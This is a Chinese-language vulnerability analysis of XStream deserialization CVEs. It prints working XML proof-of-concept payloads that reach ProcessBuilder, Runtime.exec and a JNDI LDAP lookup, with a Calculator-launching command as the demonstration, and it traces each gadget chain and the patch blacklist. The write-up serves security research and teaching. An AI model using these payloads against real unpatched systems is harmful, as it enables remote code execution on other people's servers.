## XStream反序列化漏洞

### 漏洞挖掘特点
从某个`XXXConverter.unmarshal()`方法入手。看该unmarshal是否能调用到TreeMap.put()、HashMap.put()等反序列化常见调用点。例如
CVE-2013-7285，将`TreeSetConverter.unmarshal()`作为入口，调用到TreeMap.put()。参照CC8的构造思路，向下寻找compare方法。      
CVE-2020-26217，将`MapConverter.unmarshal()`作为入口，调用到HashMap.put()，参照CC6，可以向下从hash、hashCode入手进行构造。       
CVE-2021-21345，将`AbstractReflectionConverter.unmarshal()`作为入口，调用PriorityQueue.readObject()，参照CommonsBeautils，可以向下从heapify、siftDownUsingComparator、compare入手构造。      
CVE-2021-39144，将`AbstractReflectionConverter.unmarshal()`作为入口，调用PriorityQueue.readObject()，参照CommonsBeautils，siftDownComparable入手构造     

### CVE-2013-7285
* Affected Version <= 1.4.6 (and 1.4.10)  
* POC
```
<sorted-set>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/System/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

* #### POC拆解
动态代理（在运行期间动态创建接口对象）。demo如下，Hello是要实现的接口。hello.morning会自动调用InvocationHandler.invoke
```
InvocationHandler handler = new InvocationHandler() {
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {...}
};

Hello hello = (Hello) Proxy.newProxyInstance(
    Hello.class.getClassLoader(), // 传入ClassLoader
    new Class[] { Hello.class }, // 传入要实现的接口
    handler); // 传入处理调用方法的InvocationHandler
hello.morning("Bob");
```
poc的动态代理写法，compareTo会自动调用EventHandler.invoke
```
EventHandler ih = new EventHandler(new java.lang.ProcessBuilder("open","/System/Applications/Calculator.app"),"start",null,null);
Comparable cp = (Comparable) Proxy.newProxyInstance(Comparable.class.getClassLoader(),new Class[] { Comparable.class },ih);
cp.compareTo(null);
```
上述Java对象调用过程如何转换成xml？
外层，动态代理对象Proxy.newProxyInstance参数，官方也给出了动态代理转换Converter的Demo，即xml对应interface和InvocationHandler参数，类需要采用全限定类名
```
public static Object newProxyInstance(ClassLoader loader,Class<?>[] interfaces,InvocationHandler h)

<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    ...
  </handler>
</dynamic-proxy>
```
内层，EventHandler构造函数赋值了该类的四个属性，后两个参数值传入的null，前两个按照target和action标签生成
```
public EventHandler(Object target, String action, String eventPropertyName, String listenerMethodName) {
  this.target = target;
  this.action = action;      
  this.eventPropertyName = eventPropertyName;
  this.listenerMethodName = listenerMethodName;
}

<target class="java.lang.ProcessBuilder">
  ...
</target>
<action>start</action>
```
最内层，传入ProcessBuilder，赋值的是该类的command属性。所以对应xml标签是command
```
public ProcessBuilder(String... command) {
    this.command = new ArrayList<>(command.length);
    for (String arg : command)
        this.command.add(arg);
}

<command>
    <string>open</string>
    <string>/System/Applications/Calculator.app</string>
</command>
```

* #### xml解析过程
xml的解析也就是反序列化过程，用fromXML()方法作为入口。重点在于标签的解析。（1）标签与类、类属性之间的转换 （2）标签属性与类属性值的转换。
反序列化过程最核心的两步: 
```
# (1)
Class type = HierarchicalStreams.readClassType(this.reader, this.mapper);  // 获取标签; realClass查找标签对应的接口和类;  "interface java.util.SortedSet"
Object result = this.convertAnother((Object)null, type);  // 根据type接口查/类找其实现类; 然后根据实现类找到对应的Converter; 
```
具体看一下`converAnother()`方法，实际上就是根据标签的类型找到其实现类，进而找到处理该类的转换器，进行具体反序列化过程
```
# (2)
public Object convertAnother(Object parent, Class type, Converter converter) {
    type = this.mapper.defaultImplementationOf(type);   // type对应的实现类 "class java.util.TreeSet"
    if (converter == null) {
        converter = this.converterLookup.lookupConverterForType(type);  //转换器 TreeSetConverter
    } ...
    return this.convert(parent, type, converter);  // 进入到转换器的unmarshal方法，如TreeSetConverter.unmarshal
}
```
对于这个POC来说，`TreeSetConverter.unmarshal`方法中有如下一行代码，表明TreeSetConverter实际用了treeMapConverter对comparator进行解析。所以另一种poc是用`tree-map`标签替换了`sorted-set`标签
```
this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);  // -> this.putCurrentEntryIntoMap(reader, context, result, sortedMap);
```
这一行的实际调用代码如下
```
# (3)
protected void putCurrentEntryIntoMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target) {
    Object key = this.readItem(reader, context, map); // 这一步和(1)中的代码一样，对子标签开始上述反序列化过程，获取标签对应的class类型。上述poc中的子标签是dynamic-proxy，对应转换器就是DynamicProxyConverter
    target.put(key, key);
}
```
这里解析一下`DynamicProxyConverter`的`unmarshal`过程
```
# (4)
for(handlerType = null; reader.hasMoreChildren(); reader.moveUp()) {  // 循环遍历同级标签
    String elementName = reader.getNodeName();  // 获取标签名称
    if (elementName.equals("interface")) {
        interfaces.add(this.mapper.realClass(reader.getValue()));  // 获取标签值, realClass找到该值对应的类或接口, "interface java.lang.Comparable"
    } else if (elementName.equals("handler")) {
        handlerType = this.mapper.realClass(reader.getAttribute("class")); // 获取class属性对应值， "class java.beans.EventHandler"
    }
}

handler = (InvocationHandler)context.convertAnother(proxy, handlerType); // 对EventHandler进行反序列化，EventHandler对应的转换器是ReflectionConverter
```
然后进入到`AbstractReflectionConverter`的`unmarshal`过程
```
# (5)
public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    Object result = this.instantiateNewInstance(reader, context);  // 对handlerType对应的类进行实例化
    result = this.doUnmarshal(result, reader, context);  // 写入类的属性值
    return this.serializationMethodInvoker.callReadResolve(result);
}
```
doUnmarshal方法简化如下
```
# (6)
public Object doUnmarshal(Object result, HierarchicalStreamReader reader, UnmarshallingContext context) {
    Class resultType = result.getClass();
    Iterator it = reader.getAttributeNames();
    while(it.hasNext()) { 
        Field field = this.reflectionProvider.getFieldOrNull(resultType, "class"); //获取标签中class属性对应的类属性
    }
    for(implicitCollectionsForCurrentObject = null; reader.hasMoreChildren(); reader.moveUp()) {
        reader.moveDown();
        originalNodeName = reader.getNodeName();  // 获取子节点名称，如target标签
        field = this.reflectionProvider.getFieldOrNull(classDefiningField, fieldName);
        ...
        classAttribute = HierarchicalStreams.readClassAttribute(reader, this.mapper); // 获取target标签后class属性值
        if (classAttribute != null) {
            type = this.mapper.realClass(classAttribute);  // 获取class属性值对应的类 "class java.lang.ProcessBuilder"
        } else {
            type = this.mapper.defaultImplementationOf(field.getType()); // 如果标签没有class属性值，就获取标签的数据类型对应的接口/实现类，例如command标签对应的数据类型是ArrayList
        }

        value = this.unmarshallField(context, result, type, field);  // -> convertAnother -> convert -> 进入代码段(5)，实例化target对应的ProcessBuilder,再执行doUnmarshal对子标签解析，如command
        
        this.reflectionProvider.writeField(result, fieldName, value, field.getDeclaringClass());
        seenFields.add(new FastField(field.getDeclaringClass(), fieldName));
    }
}

public Field fieldOrNull(Class cls, String name, Class definedIn) {
    Field field = (Field)fields.get(definedIn != null ? new FieldKey(name, definedIn, -1) : name); // fields中包含该类所有的属性对应情况，形如target -> {Field@1758} "private java.lang.Object java.beans.EventHandler.target"
    return field;
}
```
doUnmarshal对子标签进行循环解析,解析Command子标签，ArrayList类型对应转换器CollectionConverter，然后进入到CollectionConverter.unmarshal。再对子标签String进行解析，String对应转换器SingleValueConverterWrapper，它的unmarshal方法实际就是对String标签中的值进行获取

* #### 漏洞成因
这个poc的入口选取的Sorted-set，对应TreeSetConverter
```
TreeSetConverter.unmarshal()
  TreeMapConverter.populateTreeMap()
    TreeMap.putAll()
      AbstractMap.putAll()
        TreeMap.put()
          TreeMap.compare()
            $Proxy0.compareTo()
              EventHandler.invoke()
                EventHandler.invokeInternal()
                  ...
                    ProcessBuilder.start()
```
执行到EventHandler.invokeInternal()中，有一句反射调用，此时传入的targetMethod是`ProcessBuilder.start()`，target是`ProcessBuilder`对象，newArgs是参数数组
```
return MethodUtil.invoke(targetMethod, target, newArgs);
```

* #### POC2
上面提到treeSet底层也是用treeMap来处理的，所以可以用treemap标签来替换
```
<tree-map>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>open</string>
                        <string>/System/Applications/Calculator.app</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```
TreeMap的基础用法和对应的xml结构如下，然后将对象换成动态代理即可。
```
Map<String, String> map = new TreeMap<>();
map.put("axisx", "ddd");

<tree-map>
  <entry>
    <string>axisx</string>
    <string>ddd</string>
  </entry>
</tree-map>
```
#### 补丁修复
EventHandler对应的转换器是ReflectionConverter，修复时在ReflectionConverter中禁止了EventHandler。后续则是在SecurityMapper#readClass把EventHandler作为黑名单。
```
public boolean canConvert(Class type) {
    return ((this.type != null && this.type == type) || (this.type == null && type != null && type != eventHandlerType))
        && canAccess(type);
}
```

### CVE-2020-26217
* Affected Version <= 1.4.13
* POC
```
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='javax.imageio.spi.FilterIterator'>
                  <iter class='java.util.ArrayList$Itr'>
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>open</string>
                          <string>/System/Applications/Calculator.app</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

* #### 漏洞成因
```
MapConverter.unmarshal()
  MapConverter.populateMap()
    MapConverter.putCurrentEntryIntoMap()
      HashMap.put()
        HashMap.hash()
          jdk.nashorn.internal.objects.NativeString.hashCode()
            jdk.nashorn.internal.objects.NativeString.getStringValue()
              com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString()
                com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()
                  com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom()
                    java.io.SequenceInputStream.read()
                      java.io.SequenceInputStream.nextStream()
                        javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.nextElement()
                          javax.imageio.spi.FilterIterator.next()
                            javax.imageio.ImageIO$ContainsFilter.filter()
                              ProcessBuilder#start
```
#### 补丁修复
黑名单加入了java.lang.ProcessBuilder和javax.imageio.ImageIO$ContainsFilter

虽然CVE-2020-26217修复后加入了上述黑名单，但是依旧可以用此链条在造成一些恶意攻击，例如CVE-2020-26258（SSRF）和CVE-2020-26259（任意文件删除）。二者和CVE-2020-26217的区别从`com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()`这行调用开始。SSRF走向了`javax.activation.URLDataSource.getInputStream()`进而调用了URL类的openStream方法。任意文件删除则是走向了`com.sun.xml.internal.ws.util.ReadAllStream$FileStream.close()`

在CVE-2020-26258之后的SSRF（CVE-2021-21342）底层依然用的`javax.activation.URLDataSource.getInputStream()`，但是上层则是结合了PriorityQueue。先来看一下PriorityQueue相关的RCE漏洞。

### CVE-2021-21345
* Affected Version <= 1.4.15
* POC
```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>open /System/Applications/Calculator.app</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

#### 漏洞成因
```
AbstractReflectionConverter.unmarshal()
  SerializationMembers.callReadObject()
    SerializableConverter.doUnmarshal()
      PriorityQueue.readObject()
        PriorityQueue.heapify()
          PriorityQueue.siftDown()
            PriorityQueue.siftDownUsingComparator()
              sun.awt.datatransfer.DataTransferer$IndexOrderComparator.compare()
                sun.awt.datatransfer.DataTransferer$IndexedComparator.compareIndices()
                  com.sun.xml.internal.ws.client.ResponseContext.get()
                    com.sun.xml.internal.ws.api.message.MessageWrapper.getAttachments()
                      com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getAttachments()
                        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage()
                          com.sun.xml.internal.ws.message.JAXBAttachment.getInputStream()
                            com.sun.xml.internal.ws.message.JAXBAttachment.asInputStream()
                              com.sun.xml.internal.ws.message.JAXBAttachment.writeTo()
                                com.sun.xml.internal.ws.db.glassfish.BridgeWrapper.marshal()
                                  com.sun.xml.internal.bind.api.Bridge.marshal()
                                    com.sun.xml.internal.bind.v2.runtime.BridgeImpl.marshal()
                                      com.sun.xml.internal.bind.v2.runtime.MarshallerImpl.write()
                                        com.sun.xml.internal.bind.v2.runtime.XMLSerializer.childAsXsiType()
                                          com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl.serializeURIs()
                                            com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection.get()
                                              com.sun.corba.se.impl.activation.ServerTableEntry.verify()
                                                ProcessBuilder.start()
```

CVE-2021-21342的SSRF还是走向`javax.activation.URLDataSource.getInputStream()`，替换了这个RCE的`com.sun.xml.internal.ws.message.JAXBAttachment.getInputStream()`。文件删除则是在`com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage()`这步走向了不同的方向，SSRF和RCE都利用的`getInputStream()`，文件删除则是利用`getContextType()`
```
mpp = new MimeMultipartParser(this.dataSource.getInputStream(), this.dataSource.getContentType(), this.feature);      
```
后续调用链如下
```
com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource.getContentType()
  com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getContentType()
    com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getHeaders()
      com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress()
        java.io.FileInputStream.close()
          java.nio.channels.spi.AbstractInterruptibleChannel.close()
            sun.nio.ch.FileChannelImpl.implCloseChannel()
              sun.plugin2.ipc.unix.DomainSocketNamedPipe.close()
```
另一个代码执行CVE-2021-21344的payload，调用栈基本一致，但在`com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection.get()`这步后反射调用的是JdbcRowSetImpl，后续调用链如下
```
com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
  com.sun.rowset.JdbcRowSetImpl.connect()
    javax.naming.InitialContext.lookup()
```

CVE-2021-21347代码执行漏洞则是在compare方法的选择上有了不同，和CVE-2020-26217相结合。区别在于`java.io.SequenceInputStream.nextStream()`方法中有nextElement()和hasMoreElements()两个调用方向，这个CVE选择了和hasMoreElements方向进行构造，最终走到URLClassloader进行类加载。
```
javafx.collections.ObservableList$1.compare()
  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString()
    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()
      com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom()
        java.io.SequenceInputStream.read()
          java.io.SequenceInputStream.nextStream()
            javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements()
              com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator.hasNext()
                URLClassloader.loadClass()
```
CVE-2021-21349SSRF漏洞，和CVE-2021-21347类似，只是在寻找hasNext时，`com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator.hasNext()`，然后`com.sun.xml.internal.ws.util.ServiceFinder.parse()`解析会调用URL类发送请求。CVE-2021-21350代码执行漏洞和
CVE-2021-21347类似，只是将最终调用的URLClassLoader换成了`com.sun.org.apache.bcel.internal.util.ClassLoader`


CVE-2021-21346相对上面这些是条新链，和CVE-2021-21351类似。毕竟是一个作者挖的。先来看CVE-2021-21346
```
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='javax.swing.MultiUIDefaults' serialization='custom'>
      <unserializable-parents/>
      <hashtable>
        <default>
          <loadFactor>0.75</loadFactor>
          <threshold>525</threshold>
        </default>
        <int>700</int>
        <int>0</int>
      </hashtable>
      <javax.swing.UIDefaults>
        <default>
          <defaultLocale>zh_CN</defaultLocale>
          <resourceCache/>
        </default>
      </javax.swing.UIDefaults>
      <javax.swing.MultiUIDefaults>
        <default>
          <tables>
            <javax.swing.UIDefaults serialization='custom'>
              <unserializable-parents/>
              <hashtable>
                <default>
                  <loadFactor>0.75</loadFactor>
                  <threshold>525</threshold>
                </default>
                <int>700</int>
                <int>1</int>
                <sun.swing.SwingLazyValue>
                  <className>javax.naming.InitialContext</className>
                  <methodName>doLookup</methodName>
                  <args>
                    <arg>ldap://localhost:1099/CallRemoteMethod</arg>
                  </args>
                </sun.swing.SwingLazyValue>
              </hashtable>
              <javax.swing.UIDefaults>
                <default>
                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
                  <resourceCache/>
                </default>
              </javax.swing.UIDefaults>
            </javax.swing.UIDefaults>
          </tables>
        </default>
      </javax.swing.MultiUIDefaults>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```
调用栈如下，和CVE-2013-7285一样，以sorted-set作为起始标签，由`TreeSetConverter.unmarshal()`进行解析,但是`TreeMap.put()`之后发生变化
```
TreeSetConverter.unmarshal()
  TreeMapConverter.populateTreeMap()
    TreeMap.putAll()
      AbstractMap.putAll()
        TreeMap.put()
          javax.naming.ldap.Rdn$RdnEntry.compareTo()
            com.sun.org.apache.xpath.internal.objects.XString.equals()
              javax.swing.MultiUIDefaults.toString()
                javax.swing.MultiUIDefaults.get()
                  javax.swing.UIDefaults.get()
                    javax.swing.UIDefaults.getFromHashtable()
                      sun.swing.SwingLazyValue.createValue()
                        javax.naming.InitialContext.doLookup()
                          javax.naming.InitialContext.lookup()
```
CVE-2021-39146和上述调用链非常类似，只是在`javax.swing.UIDefaults.getFromHashtable()`后调用方向不同
```
javax.swing.UIDefaults$ProxyLazyValue.createValue()
  javax.swing.UIDefaults$ProxyLazyValue$1.run()
    javax.naming.InitialContext.doLookup()
```
CVE-2021-21351同样是调用`InitialContext.lookup()`，但是是从`JdbcRowSetImpl.connect()`执行到的。调用链的上半部分则是在`com.sun.org.apache.xpath.internal.objects.XString.equals()`后调用了不同的toString()。CVE-2021-21351调用链如下
```
com.sun.org.apache.xpath.internal.objects.XObject.toString()
  com.sun.org.apache.xpath.internal.objects.XRTreeFrag.str()
    com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM.getStringValue()
      com.sun.org.apache.xml.internal.dtm.ref.DTMDefaultBase._firstch()
        com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM.nextNode()
          com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces.deliverMoreNodes()
            com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces.parseSome()
              com.sun.rowset.JdbcRowSetImpl.connect()
```
CVE-2021-39148同样是`com.sun.org.apache.xpath.internal.objects.XString.equals()`后调用了不同的toString()
```
com.sun.xml.internal.ws.api.message.Packet.toString()
  com.sun.xml.internal.ws.api.message.MessageWrapper.copy()
    com.sun.xml.internal.ws.message.saaj.SAAJMessage.copy()
      com.sun.xml.internal.ws.message.saaj.SAAJMessage.getAttachments()
        com.sun.xml.internal.messaging.saaj.soap.MessageImpl.getAttachments()
          com.sun.xml.internal.messaging.saaj.soap.MessageImpl.initializeAllAttachments()
            com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeMultipart.getCount()
              com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parse()
                com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart.parseAll()
                  com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.getAttachments()
                    com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.parseAll()
                      com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress()
                        com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.hasNext()
                          com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator.findNextCert()
                            com.sun.jndi.toolkit.dir.ContextEnumerator.nextElement()
                              com.sun.jndi.toolkit.dir.ContextEnumerator.next()
                                com.sun.jndi.toolkit.dir.ContextEnumerator.getNextDescendant()
                                  com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild()
                                    com.sun.jndi.toolkit.dir.ContextEnumerator.newEnumerator()
                                      com.sun.jndi.toolkit.dir.ContextEnumerator.getImmediateChildren()
                                        com.sun.jndi.ldap.LdapReferralContext.listBindings()
                                          javax.naming.spi.ContinuationContext.listBindings()
                                            javax.naming.spi.ContinuationContext.getTargetContext()
                                              javax.naming.spi.NamingManager.getContext()
                                                javax.naming.spi.NamingManager.getObjectInstance()
```


### CVE-2021-39144
* Affected Version <= 1.4.17
* POC
```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='java.lang.Runtime'/>
              <implementing__method>
                <class>java.lang.Runtime</class>
                <name>exec</name>
                <parameter-types>
                  <class>java.lang.String</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <string>open /System/Applications/Calculator.app</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

#### 漏洞成因
```
AbstractReflectionConverter.unmarshal()
  PriorityQueue.readObject()
    PriorityQueue.heapify()
      PriorityQueue.siftDown()
        PriorityQueue.siftDownComparable()
          com.sun.proxy.$Proxy0.compareTo()
            sun.tracing.ProviderSkeleton.invoke()
              sun.tracing.ProviderSkeleton.triggerProbe()
                sun.tracing.dtrace.DTraceProbe.uncheckedTrigger()
                  ProcessBuilder.start()
```
CVE-2021-39141与之类似，但是在`com.sun.proxy.$Proxy0.compareTo()`之后调用了不同的invoke
```
com.sun.xml.internal.ws.client.sei.SEIStub.invoke()
  com.sun.xml.internal.ws.client.sei.SyncMethodHandler.invoke()
    com.sun.xml.internal.ws.db.DatabindingImpl.serializeRequest()
      com.sun.xml.internal.ws.client.sei.StubHandler.createRequestPacket()
        com.sun.xml.internal.ws.client.sei.BodyBuilder$JAXB.createMessage()
          com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit.build()
            com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor$2.set()
              com.sun.xml.internal.ws.spi.db.MethodSetter.set()
                com.sun.xml.internal.ws.spi.db.MethodSetter$1.run()
                  javax.naming.InitialContext.doLookup()
```
